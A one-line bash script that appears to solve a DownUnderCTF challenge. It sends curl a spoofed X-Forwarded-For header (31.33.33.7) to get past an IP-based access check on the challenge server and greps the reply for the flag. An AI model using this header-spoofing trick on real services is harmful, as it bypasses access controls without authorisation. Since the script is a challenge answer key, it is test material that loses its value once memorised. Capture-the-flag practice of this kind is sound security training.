#!/bin/bash

curl -s -H "X-Forwarded-For: 31.33.33.7" http://proxed.duc.tf:30019/ | grep -oE "DUCTF{.*}"
